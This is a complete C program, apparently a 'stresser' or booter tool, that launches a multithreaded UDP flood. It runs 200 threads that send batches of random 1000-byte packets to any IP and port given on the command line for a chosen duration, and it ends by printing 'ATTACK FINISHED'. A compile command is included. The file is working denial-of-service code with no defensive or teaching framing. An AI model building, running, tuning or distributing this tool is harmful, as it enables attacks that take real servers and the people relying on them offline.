/* SPIKE Random Auto Big Payload */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <time.h>
#include <sys/time.h>

#define MAX_THREADS 200
#define BUFFER_SIZE 1000
#define BATCH_SEND 9 // Number Of Packets To Send Per Batch

typedef struct {
    char *ip;
    int port;
    int duration;
    int thread_id;
} thread_data_t;

void create_game_packet(char *buffer, int buffer_size) {
    // Fill Packet With Random Data Once
    for (int i = 0; i < buffer_size; i++) {
        buffer[i] = (char)(rand() % 256);
    }
}

void *udp_flood(void *arg) {
    thread_data_t *data = (thread_data_t *)arg;
    int sockfd;
    struct sockaddr_in target;
    char buffer[BUFFER_SIZE];

    // Seed The Random Number Generator With A Unique Value Per Thread
    srand(time(NULL) + data->thread_id);

    // Create The UDP Socket
    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        perror("Socket Creation Failed");
        pthread_exit(NULL);
    } 

    // Optimize Socket Buffer Size For Sending Large Quantities Of Packets
    int optval = 1 << 20; // 1 MB Buffer
    setsockopt(sockfd, SOL_SOCKET, SO_SNDBUF, &optval, sizeof(optval));

    // Set Up Target Address Information 
    memset(&target, 0, sizeof(target));
    target.sin_family = AF_INET;
    target.sin_port = htons(data->port);
    inet_pton(AF_INET, data->ip, &target.sin_addr);

    // Generate The Packet Content Outside The Loop
    create_game_packet(buffer, BUFFER_SIZE);

    // Get The Time When The Flood Should Stop
    struct timeval start_time, current_time;
    gettimeofday(&start_time, NULL);
    time_t end_time = start_time.tv_sec + data->duration;

    // Loop Until The Duration Expires 
    while (1) {
        gettimeofday(&current_time, NULL);
        if (current_time.tv_sec >= end_time) break;

        // Send A Batch Of Packets To Reduce System Call Overhead
        for (int i = 0; i < BATCH_SEND; i++) {
            if (sendto(sockfd, buffer, sizeof(buffer), 0, (struct sockaddr *)&target, sizeof(target)) < 0) {
                perror("Send Failed");
                break;
            }
        }
    } 


    close(sockfd);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc != 4) { // We Expect Only 3 arguments: IP, Port, Duration
        printf("Usage: %s <IP> <PORT> <TIME>\n", argv[0]);
        exit(1);
    }

    char *ip = argv[1];
    int port = atoi(argv[2]);
    int duration = atoi(argv[3]);
    int num_threads = MAX_THREADS; // Automatically Set To 200 Threads

    printf("Starting UDP Flood To %s:%d With %d Threads For %d Seconds.\n", ip, port, num_threads, duration);

    // Create An Array Of Threads And Data For Each Thread
    pthread_t threads[MAX_THREADS];
    thread_data_t thread_data[MAX_THREADS];

    // Launch Threads
    for (int i = 0; i < num_threads; i++) {
        thread_data[i].ip = ip;
        thread_data[i].port = port;
        thread_data[i].duration = duration;
        thread_data[i].thread_id = i;

        if (pthread_create(&threads[i], NULL, udp_flood, (void *)&thread_data[i]) != 0) {
            perror("Pthread Create Failed");
            exit(1);
        }
    }

    // Wait For All Threads To Finish
    for (int i = 0; i < num_threads; i++) {
        pthread_join(threads[i], NULL);
    }

    printf("ATTACK FINISHED\n");

    return 0;
}

/* gcc -o file file.c -lpthread -static */